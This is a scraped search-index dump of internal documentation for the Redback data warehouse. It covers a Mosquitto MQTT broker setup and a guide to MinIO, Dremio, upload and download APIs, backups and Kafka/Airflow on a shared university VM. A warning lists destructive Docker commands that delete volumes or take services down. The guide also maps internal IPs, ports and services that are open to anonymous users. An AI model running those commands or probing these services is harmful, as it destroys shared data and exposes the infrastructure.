Summary​","type":1,"pageTitle":"Mosquitto MQTT Broker","url":"/redback-documentation/docs/data-warehousing/Mosquitto/mosquitto_documentation#installation-summary","content":" To install and enable the Mosquitto broker and client tools:  sudo apt update sudo apt install -y mosquitto mosquitto-clients sudo systemctl enable mosquitto sudo systemctl start mosquitto     ","version":"Next","tagName":"h2"},{"title":"Configuration​","type":1,"pageTitle":"Mosquitto MQTT Broker","url":"/redback-documentation/docs/data-warehousing/Mosquitto/mosquitto_documentation#configuration","content":" ","version":"Next","tagName":"h2"},{"title":"Primary Config File​","type":1,"pageTitle":"Mosquitto MQTT Broker","url":"/redback-documentation/docs/data-warehousing/Mosquitto/mosquitto_documentation#primary-config-file","content":" Path: /etc/mosquitto/mosquitto.conf  pid_file /var/run/mosquitto.pid # Persistence persistence true persistence_location /var/lib/mosquitto/ # Logging log_dest file /var/log/mosquitto/mosquitto.log log_type all # Include additional configs include_dir /etc/mosquitto/conf.d   Common options:  Option\tDescriptionlistener &lt;port&gt;\tSet the port the broker listens on allow_anonymous\tAllow connections without username/password persistence true\tEnable message persistence log_dest stdout\tLog output to stdout (useful for Docker) password_file\tFile containing valid user credentials  ","version":"Next","tagName":"h3"},{"title":"Key Parameters​","type":1,"pageTitle":"Mosquitto MQTT Broker","url":"/redback-documentation/docs/data-warehousing/Mosquitto/mosquitto_documentation#key-parameters","content":" Persistence ensures messages and subscriptions survive broker restarts.Logging is set to capture all message and connection-related activity.`` allows modular configuration files (e.g., future access control or TLS settings).    ","version":"Next","tagName":"h3"},{"title":"Logs & Monitoring​","type":1,"pageTitle":"Mosquitto MQTT Broker","url":"/redback-documentation/docs/data-warehousing/Mosquitto/mosquitto_documentation#logs--monitoring","content":" ","version":"Next","tagName":"h2"},{"title":"View Log Output​","type":1,"pageTitle":"Mosquitto MQTT Broker","url":"/redback-documentation/docs/data-warehousing/Mosquitto/mosquitto_documentation#view-log-output","content":" sudo tail -f /var/log/mosquitto/mosquitto.log   ","version":"Next","tagName":"h3"},{"title":"Common Log Entries​","type":1,"pageTitle":"Mosquitto MQTT Broker","url":"/redback-documentation/docs/data-warehousing/Mosquitto/mosquitto_documentation#common-log-entries","content":" Connection statusTopic subscriptionsMessage publishingErrors or config issues    ","version":"Next","tagName":"h3"},{"title":"Troubleshooting​","type":1,"pageTitle":"Mosquitto MQTT Broker","url":"/redback-documentation/docs/data-warehousing/Mosquitto/mosquitto_documentation#troubleshooting","content":" Problem\tSuggested FixPort 1883 not open or refused\tConfirm the service is active: sudo systemctl status mosquitto Messages not received\tVerify topic names and client connectivity Broker fails to start\tCheck config file syntax and permissions in conf.d/ Log file not updating\tEnsure write permissions for /var/log/mosquitto/    ","version":"Next","tagName":"h2"},{"title":"File & Directory Summary​","type":1,"pageTitle":"Mosquitto MQTT Broker","url":"/redback-documentation/docs/data-warehousing/Mosquitto/mosquitto_documentation#file--directory-summary","content":" Path\tDescription/etc/mosquitto/mosquitto.conf\tMain broker configuration /etc/mosquitto/conf.d/\tDirectory for additional configs /var/log/mosquitto/mosquitto.log\tPrimary log file /var/lib/mosquitto/\tPersistence data location ","version":"Next","tagName":"h2"},{"title":"Welcome to the Redback Data Warehouse Complete Technical Guide","type":0,"sectionRef":"#","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide","content":"","keywords":"","version":"Next"},{"title":"The Virtual Machine (VM) – Core Infrastructure​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#the-virtual-machine-vm--core-infrastructure","content":" The Redback Data Warehouse is hosted entirely on a dedicated Deakin on-premises virtual machine (VM), located within the university's infrastructure. This VM serves as the central hub for all data warehouse services and storage.  ","version":"Next","tagName":"h2"},{"title":"Key Characteristics​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#key-characteristics","content":" Linux-based OS (Ubuntu) maintained by Deakin IT500GB local storage capacityNo cloud capabilities – all tools must be deployable on bare-metalDocker-powered environment – all services run in containersShared system – used by multiple projects and users (cross-team)  ","version":"Next","tagName":"h3"},{"title":"How the VM Powers the Warehouse​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#how-the-vm-powers-the-warehouse","content":" The VM hosts and runs all critical tools and services, including:  MinIO (object storage)Dremio (query engine)MongoDB (NoSQL database)Streamlit File Upload ServiceFlask APIsApache Airflow &amp; Kafka (ETL &amp; streaming)Spark, Elasticsearch, Postgres, and more  Each of these services runs in an isolated Docker container. This allows for flexible deployment, upgrades, and modular management — but comes with the caveat that any restart or misconfiguration affects the shared production environment.  VM operations require careful coordination. If you're unsure, check with a DW leader before restarting, modifying, or adding containers.  ⚠️Important Warning – Shared VM Environment The Redback Data Warehouse runs on a shared production Virtual Machine (VM) used by all teams. Any changes to services or containers affect everyone using the system. ⚠️ Do NOT run destructive or high-impact commands like docker rm, docker volume rm, or docker-compose down without first consulting the Data Warehouse team lead or your mentor. Such actions can: Permanently delete project data or volumesBreak core infrastructure (MinIO, Dremio, Kafka, etc.)Disrupt other projects that rely on running containers Always coordinate changes or troubleshooting with team leadership. If unsure, ask first.    ","version":"Next","tagName":"h3"},{"title":"VM Access Overview​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#vm-access-overview","content":" Access is available to authorized users only via VPN + SSH:  Connect to Deakin VPN using Cisco AnyConnectAccess via terminal (ssh yourusername@redback.it.deakin.edu.au) or VSCode Remote SSHRecommended: Create a personal working folder inside the VM and clone the GitHub repo  Admins can create new VM users via sudo adduser &lt;username&gt;, but credentials must be shared securely.    ","version":"Next","tagName":"h3"},{"title":"Docker Notes​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#docker-notes","content":" All services are listed via docker ps Restart core infrastructure with docker compose up -d Persistent Volumes are configured for critical tools like Dremio, MinIO, and Postgres to retain data even on restart    ","version":"Next","tagName":"h3"},{"title":"Key Addresses​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#key-addresses","content":" Service\tURL/PortVM SSH\tssh &lt;user&gt;@redback.it.deakin.edu.au File Upload Service\thttp://10.137.0.149:80/ MinIO\thttp://10.137.0.149:9001/login Dremio\thttp://10.137.0.149:9047/ MongoDB API\thttp://10.137.0.149:5003/documents Spark Jupyter Notebooks\thttp://10.137.0.149:8888/ Flask API (Downloads)\thttp://10.137.0.149:5000/ Kibana (Logs - if active)\thttp://10.137.0.149:5601/    See full access steps and Docker commands in the VM Access Guide (ONB2)  ","version":"Next","tagName":"h3"},{"title":"Background – Requirements Gathering Summary​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#background--requirements-gathering-summary","content":" Before building the Redback Data Warehouse infrastructure, a structured requirements gathering process was conducted through stakeholder meetings and surveys. The goal was to understand project-level and company-wide needs and evaluate suitable Data Lakehouse solutions.  ","version":"Next","tagName":"h2"},{"title":"Key Pain Points Identified:​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#key-pain-points-identified","content":" No centralized platform for storing and accessing company-wide data.Frequent issues with updating datasets (manual Git workflows).Need for supporting both structured and unstructured data.Budget constraints and student turnover requiring low-code, easy-to-learn tools.Licensing issues tied to individual users — not scalable for rotating student teams.  ","version":"Next","tagName":"h3"},{"title":"Key Requirements Defined:​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#key-requirements-defined","content":" Must scale to accommodate multiple projects.Supports CSV, JSON, media, and other object formats.Low technical entry barrier (GUI, minimal setup).Free/open-source or trial-based licensing preferred.Centralized data access and governance.  Based on these, tools like MinIO, Dremio, MongoDB, and Apache Airflow were selected and tested.  View Full Requirements Document  ","version":"Next","tagName":"h3"},{"title":"Data Architecture & Platform Rationale​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#data-architecture--platform-rationale","content":" Redback Operations adopted a Data Lakehouse architecture in Trimester 1, 2024, after operating without a centralized data platform. Initial requirements were gathered through interviews and surveys with project and company leaders, which led to a focus on open-source, scalable, and VM-compatible technologies.  Since then, the platform has grown significantly and now supports real-time pipelines, orchestration tools, automated backups, and enhanced governance layers — all running on a shared Dockerized VM environment.    ","version":"Next","tagName":"h2"},{"title":"Why a Data Lakehouse?​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#why-a-data-lakehouse","content":" A Data Lakehouse combines the flexibility of a Data Lake with the governance features of a Data Warehouse. This hybrid design supports:  Native file/object storage (CSV, JSON, images, etc.)SQL-compatible querying (via Dremio)Versioning and rollback (via Apache Iceberg + Nessie)Cost-effective, on-premises deployment on the Deakin VMCentralization for collaboration across rotating student teams    ","version":"Next","tagName":"h3"},{"title":"Tools Currently in Use (T1 2025)​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#tools-currently-in-use-t1-2025","content":" Tool / Service\tRole in EcosystemDremio\tSQL query engine + GUI frontend for browsing and querying data MinIO\tS3-compatible object storage backend for both raw (Bronze) and cleaned (Silver) data Streamlit App\tUpload interface for data files with optional preprocessing MongoDB\tJSON storage for semi-structured data used by various projects PostgreSQL\tProvenance metadata store (used in ELK pipelines) Apache Iceberg\tACID-compliant table format for versioned datasets in Dremio Nessie\tMetadata catalog and rollback manager for Dremio (experimental stage) Flask API\tEnables safe, secure data querying and file downloads via HTTP Kafka\tMessage broker used for real-time pipelines (e.g., Project 4 image ingestion) Apache Airflow\tOrchestrates processing pipelines triggered by Kafka or scheduled jobs FastAPI\tAPI layer connecting frontend uploads to backend workflows (Kafka + Airflow) Docker\tContainer orchestration for all services running on the shared production VM Restic\tDocker-based backup solution for key volumes and containers Spark Notebooks\tJupyter + Spark environment (available, but not in active use) ClamAV\tVirus scanner container for uploaded files (currently experimental) Wazuh\tSecurity monitoring suite (shared with Cybersecurity team on VM) Elasticsearch\tIndexes logs from all tools (provenance) Logstash\tPipeline to parse &amp; forward logs Kibana\tLog dashboard/visualisation tool (not active) PostgreSQL (Provenance)\tStructured storage of event logs Restic\tDocker volume backup system  All services are deployed on a shared Linux-based VM (redback.it.deakin.edu.au) using Docker. Admin rights and service restarts should be handled with care.    ","version":"Next","tagName":"h3"},{"title":"Medallion Architecture​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#medallion-architecture","content":" Redback follows the Medallion Lakehouse model — a layered storage strategy:  Bronze Layer: Raw, unprocessed source data. Not user-editable.Silver Layer: Cleaned and transformed data. Stored in Iceberg format for versioning.Gold Layer: Final, analysis-ready data with specific aggregations or scopes.  Folder layout follows: /project_name/YYYY/tX_task_name/student_ID (optional)  This standard helps with both governance and future orchestration.    ","version":"Next","tagName":"h3"},{"title":"Typical Data Flow​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#typical-data-flow","content":" Upload data via Streamlit (or direct upload to MinIO)Store in Bronze bucket (raw layer)ETL pipeline processes file into Silver bucket (cleaned layer)Register/query data using Dremio (optionally build Gold tables/views)(Optional): Use Airflow/Kafka for automated workflows  View full Data Architecture    ","version":"Next","tagName":"h3"},{"title":"MinIO – Object Storage Backbone of the Data Warehouse​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#minio--object-storage-backbone-of-the-data-warehouse","content":" MinIO is the core object storage system used in the Redback Data Warehouse infrastructure. It functions similarly to AWS S3, allowing users to store and retrieve files through programmatic APIs or a friendly web-based GUI. It plays a central role in storing raw and processed datasets, especially CSV, TXT, JSON, XLSX files used in the File Upload Service and downstream tools like Dremio.  ","version":"Next","tagName":"h2"},{"title":"Accessing MinIO​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#accessing-minio","content":" URL: http://10.137.0.149:9000Admin Portal: http://10.137.0.149:9001Credentials: Not included here; contact the DW Team Leader or Mentor for access.  Once logged in, users will see a UI displaying MinIO &quot;buckets&quot; — essentially folders for storing categorized files.  Default Bucket for Uploads: dw-bronze-bucket Files uploaded via the Streamlit File Upload App are saved here before preprocessing or ETL.  ","version":"Next","tagName":"h3"},{"title":"Bucket Structure​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#bucket-structure","content":" MinIO separates data into Bronze and Silver tiers:  Bronze Bucket: Stores raw, unprocessed uploads.Silver Bucket: Stores cleaned, preprocessed files after ETL transformations.  This clean separation supports better data governance and makes it easy for tools like Dremio to distinguish between staging and production data.  Bucket Name\tPurposedw-bronze-bucket\tRaw files uploaded via UI or manually dw-silver-bucket\tCleaned/preprocessed data from ETL    ","version":"Next","tagName":"h3"},{"title":"How to Use MinIO – GUI vs Code​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#how-to-use-minio--gui-vs-code","content":" GUI Access (User-Friendly Option)​  Navigate to MinIO Admin PortalLogin using your assigned credentials.Browse, upload, delete, or organize files within project-specific folders.You can also generate new Access Keys and Secret Keys for programmatic use.  Programmatic Access (Recommended for Scripts)​  MinIO can be accessed using the official Python SDK (minio), behaving like AWS S3.  from minio import Minio import os client = Minio( &quot;10.137.0.149:9000&quot;, access_key=os.getenv(&quot;AWS_ACCESS_KEY&quot;), secret_key=os.getenv(&quot;AWS_SECRET_KEY&quot;), secure=False )   click here to view minio guide  ","version":"Next","tagName":"h3"},{"title":"Dremio – Interactive SQL Engine & Lakehouse UI​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#dremio--interactive-sql-engine--lakehouse-ui","content":" Dremio is the query engine and interactive layer for the Redback Data Warehouse. It connects to data stored in MinIO and MongoDB, allowing users to create virtual SQL tables and run queries directly from a browser or code interface.  Unlike traditional database engines, Dremio reads directly from object storage (MinIO), and allows teams to build virtual tables (&quot;views&quot;) on top of raw data — without duplication. Its graphical interface and SQL endpoint make it easy to use for both analysts and developers.    ","version":"Next","tagName":"h2"},{"title":"Why Dremio?​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#why-dremio","content":" Cost-effective: Free and open-source.User-friendly: Comes with a full GUI and SQL editor.Multi-source capable: Can query data from MinIO, MongoDB, PostgreSQL, and more.Time-travel support: Enables data versioning with formats like Apache Iceberg and Parquet.Safe query execution: Uses a proxy Flask API to limit risky SQL commands.    ","version":"Next","tagName":"h3"},{"title":"Accessing Dremio​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#accessing-dremio","content":" Dremio Web UI: http://10.137.0.149:9047Flask SQL API: http://10.137.0.149:5001/dremio_queryAccess: VPN required (Cisco AnyConnect) Login credentials are provided by the Data Warehouse team leader or mentor.    ","version":"Next","tagName":"h3"},{"title":"Connecting MinIO to Dremio (Source Setup)​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#connecting-minio-to-dremio-source-setup","content":" In the Dremio UI, click “Add Source”.Select Amazon S3 as the source type.Use the Access Key and Secret Key from MinIO to authenticate.In Advanced Options: Tick Enable Compatibility ModeProvide the bucket path (e.g., /project-2)Add required connection properties. Click Save.  Once saved, the MinIO bucket will be visible as a data source within Dremio’s “Sources” tab.    ","version":"Next","tagName":"h3"},{"title":"Creating Tables in Dremio (Two Ways)​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#creating-tables-in-dremio-two-ways","content":" Option 1: Using SQL Editor in GUI​  Navigate to the SQL tab in Dremio.Write a SQL SELECT, JOIN, or CREATE VIEW statement.Save the view as a virtual table to use in future queries.  Option 2: Scripted Pipeline​  A Python script (pipeline.py) exists in the Redback repository (currently in a forked branch) which:  Takes a CSV file from MinIOAutomatically creates a Dremio SQL viewRegisters it for downstream queries  This automates ingestion + query registration for power users and is expected to be merged soon into the official repo.    ","version":"Next","tagName":"h3"},{"title":"Using Flask API to Query Dremio via Code​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#using-flask-api-to-query-dremio-via-code","content":" Redback also provides a Flask API interface that lets users query Dremio securely using only SELECT statements.  Here’s an example Jupyter notebook workflow:  import requests import json import pandas as pd api_url = &quot;http://10.137.0.149:5001/dremio_query&quot; headers = { &quot;Content-Type&quot;: &quot;application/json&quot; } sql_query = { &quot;sql&quot;: &quot;SELECT * FROM \\&quot;project-3\\&quot;.\\&quot;extended_activities\\&quot; LIMIT 10;&quot; } response = requests.post(api_url, headers=headers, data=json.dumps(sql_query)) result = response.json() df = pd.DataFrame(result['rows']) display(df)   click here to view dremio guide  Other useful documents - maintaining structured dremio solution  other useful documents - how to access stored data in dremio  ","version":"Next","tagName":"h3"},{"title":"Streamlit File Upload Service – Uploading & Managing Files in the DW​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#streamlit-file-upload-service--uploading--managing-files-in-the-dw","content":" The File Upload Service (FUS) is a web-based interface built using Streamlit. It allows users to upload CSV files to the Data Warehouse in a structured and governed way. Uploaded files are stored in MinIO buckets under project-specific folders and optionally processed before storage.  This service is especially useful for team members who need a simple way to upload, clean, and manage datasets without directly interacting with the VM or MinIO backend.    ","version":"Next","tagName":"h2"},{"title":"Accessing the File Upload Interface​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#accessing-the-file-upload-interface","content":" The Streamlit app is hosted on the Redback Data Warehouse Virtual Machine.  URL: http://10.137.0.149/ (default root port (80))VPN Required: Connect using Cisco AnyConnect to access the internal network.Authentication: Once VPN is active, no additional login is required for the app.    ","version":"Next","tagName":"h3"},{"title":"How to Upload a File​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#how-to-upload-a-file","content":" Select Your Project Choose the project folder where your file will be stored (e.g., project-1, project-3). Upload File Drag and drop a file or browse for one.At the time of writing, the file formats supported by file upload service are - CSV, TXT, JSON, XLSX Choose Preprocessing (Optional) None: File is uploaded as-is.Data Clean-Up: Removes empty columns, duplicate rows, standardizes format.Machine Learning Prep: Scales numeric features, handles missing values, optimizes for ML tasks. Filename Options By default, a prefix and timestamp suffix are added (recommended for governance).Unticking the box allows you to overwrite an existing file by using the same filename. Submit Upload Click the Upload to Data Warehouse button.A success or error message will appear.  Uploaded files are stored in the dw-bronze-bucket in MinIO. If preprocessing is applied, the cleaned version is saved in the dw-silver-bucket.    ","version":"Next","tagName":"h3"},{"title":"What about ETL?​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#what-about-etl","content":" ETL is a separate trigger, not automatically tied to upload.In most cases, ETL also reads from dw-bronze-bucket, transforms the data, and may overwrite or add new files to Silver — depending on the pipeline setup.If preprocessing wasn't selected during upload, then Silver won't have that file until ETL moves it there.  ","version":"Next","tagName":"h3"},{"title":"Behind the Scenes: What Happens After Upload?​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#behind-the-scenes-what-happens-after-upload","content":" Uploaded file → stored in MinIO under selected project folder.If preprocessing is selected: A Python script processes the file using Pandas.Resulting cleaned file is uploaded to dw-silver-bucket.Metadata is appended (e.g., extract date, unique ID).    ","version":"Next","tagName":"h3"},{"title":"Downloading Files​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#downloading-files","content":" Option A: Programmatic Access via Flask API​  You can retrieve files from the VM using the Flask API:  Example – Using Python:  import requests url = &quot;http://10.137.0.149:5000/download-file&quot; params = { &quot;bucket&quot;: &quot;dw-bucket-bronze&quot;, &quot;filename&quot;: &quot;project3/testdocument_20240921.csv&quot; } response = requests.get(url, params=params) with open(&quot;downloaded_file.csv&quot;, &quot;wb&quot;) as f: f.write(response.content)   We are showing the Bronze bucket here, but it works exactly the same for Silver too — just change the bucket name.    Option B: Using curl in Terminal​  curl -o file.csv &quot;http://10.137.0.149:5000/download-file?bucket=dw-bucket-bronze&amp;filename=project3/testdocument_20240921.csv&quot;     Option C: Download via the Streamlit UI​  Go to: http://10.137.0.149/ Select the appropriate tab: View Original Files (Bronze bucket)View Pre-Processed Files (Silver bucket) Choose the relevant project from the dropdown. Select a file and click Download.  When you click the download button, the app shows the corresponding Flask API URL used under the hood.  Option D: Download directly from backend (Minio)​  Navigate to correct folder/file and manually download file.  click here to view file upload service guide  [streamlit setup documentation] (https://redback-operations.github.io/redback-documentation/docs/data-warehousing/Streamlit%20tutorial/streamlit_tutorial) - In case you need to work on implementing some upgrades in the existing file upload service or due something of your own using streamlit, this guide will be handy  ","version":"Next","tagName":"h3"},{"title":"Other Available Services (Not in Full Production)​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#other-available-services-not-in-full-production","content":" The following services are deployed on the VM but are not currently in active production use. They may be utilized in future phases or specialized projects.  Project Nessie A metadata store integrated with Dremio. Enables version control and historical tracking of datasets. Proof of concept complete, but not actively used yet. Apache Spark (Jupyter Notebooks) Jupyter environment running on the VM at http://10.137.0.149:8888/. Supports distributed Spark jobs for large-scale data processing. Currently idle due to lack of large production datasets.  click here to view documentation on additional services  ","version":"Next","tagName":"h2"},{"title":"MongoDB Connection Service​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#mongodb-connection-service","content":" MongoDB is used within the Data Warehouse for storing semi-structured data, such as .json documents. To make this easier for teams to use, a dedicated web server/API has been set up that interacts with MongoDB using RESTful endpoints.  ","version":"Next","tagName":"h2"},{"title":"Setup Overview (Admin/Dev Use)​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#setup-overview-admindev-use","content":" Repository: redback-data-warehouse/MongoDB ConnectionServices are containerized using Docker Compose.env file must include: MONGO_URIDB_NAMECOLLECTION_NAME Run with: docker-compose up --build   click here to view detailed guide on MongoDB  ","version":"Next","tagName":"h3"},{"title":"Mosquitto MQTT Broker (IoT Messaging)​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#mosquitto-mqtt-broker-iot-messaging","content":" The Data Warehouse VM hosts a lightweight Mosquitto MQTT Broker, primarily for real-time messaging and IoT simulation use cases.  ","version":"Next","tagName":"h2"},{"title":"What is MQTT?​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#what-is-mqtt","content":" MQTT (Message Queuing Telemetry Transport) is a lightweight protocol ideal for low-overhead, publish/subscribe-based communication. It’s commonly used in IoT environments or systems requiring fast, low-bandwidth updates.    ","version":"Next","tagName":"h3"},{"title":"Key Details​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#key-details","content":" Broker IP: 10.137.0.149Port: 1883 (default, unencrypted)Anonymous Access: EnabledPersistence: Enabled (messages survive broker restarts)Logs: /var/log/mosquitto/mosquitto.log    ","version":"Next","tagName":"h3"},{"title":"Setup Notes​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#setup-notes","content":" Installed via:  sudo apt update sudo apt install -y mosquitto mosquitto-clients sudo systemctl enable mosquitto sudo systemctl start mosquitto   Click here to view guide on Mosquitto MQTT  ","version":"Next","tagName":"h3"},{"title":"Restic-Docker Backup System​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#restic-docker-backup-system","content":" The Data Warehouse includes an automated backup system using Restic — a secure, open-source tool for backing up Docker volumes on the VM.  ","version":"Next","tagName":"h2"},{"title":"Purpose​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#purpose","content":" This system ensures that critical services like MinIO, PostgreSQL, Dremio, and Elasticsearch are backed up regularly. If a container crashes or data is accidentally lost, snapshots allow for fast recovery.    ","version":"Next","tagName":"h3"},{"title":"What Gets Backed Up?​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#what-gets-backed-up","content":" Restic monitors and stores snapshots of the following Docker volumes:  data-lakehouse_minio-datadata-lakehouse_minio-configfileuploadservice_dremio-datadp-postgres-datadp-es-data (Elasticsearch)dp-logstash-data  All these volumes are tied to key components of the data platform (storage, search, provenance, etc.).  ","version":"Next","tagName":"h3"},{"title":"Setup Overview (Admin Use Only)​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#setup-overview-admin-use-only","content":" To deploy the Restic backup system:  Clone the repo and navigate to the Restic directory: git clone https://github.com/Redback-Operations/redback-data-warehouse.git cd restic Create required volumes (if not already present): data-lakehouse_minio-datafileuploadservice_dremio-datadp-postgres-data, etc. Add your Restic password to restic-password.txt Start the service: chmod +x scripts/backup.sh docker-compose up -d Check logs or restore snapshots using: docker exec -it restic-backup sh restic snapshots   For complete instructions, including customisation and snapshot restoration, refer to the Restic Full Guide  ","version":"Next","tagName":"h3"},{"title":"Kafka + Airflow Stack​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#kafka--airflow-stack","content":" A Kafka-based real-time pipeline is now operational on the VM, originally developed for Project 4. This stack integrates FastAPI, Kafka, and Airflow, and it's designed to support event-driven workflows and automated DAG triggering.  This system is not limited to images — it can be adapted to trigger workflows from any kind of file upload, sensor input, log event, or status change.    ","version":"Next","tagName":"h2"},{"title":"Core Use Case Pattern​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#core-use-case-pattern","content":" User Uploads File/Trigger Event ↓ FastAPI → Kafka Producer ↓ Kafka Topic (event ingestion) ↓ Airflow DAG triggered via API ↓ Kafka Topic (result or signal) ↓ FastAPI Kafka Consumer → Result returned/logged   ","version":"Next","tagName":"h3"},{"title":"Common Use Cases for Other Teams​","type":1,"pageTitle":"Welcome to the Redback Data Warehouse Complete Technical Guide","url":"/redback-documentation/docs/data-warehousing/Instructional Documents/Redback Data Warehouse - Complete Guide#common-use-cases-for-other-teams","content":" Here are examples of how teams across Redback can reuse this system without setting up Kafka/Airflow from scratch:  Data Cleaning Pipelines​  Upload a data file through a Streamlit or FastAPI form → send to a Kafka topic → trigger Airflow DAG that:  Cleans null valuesValidates schemaPushes cleaned data to the Silver bucket in MinIO  ML Inference on Upload​  Send image/audio/text files 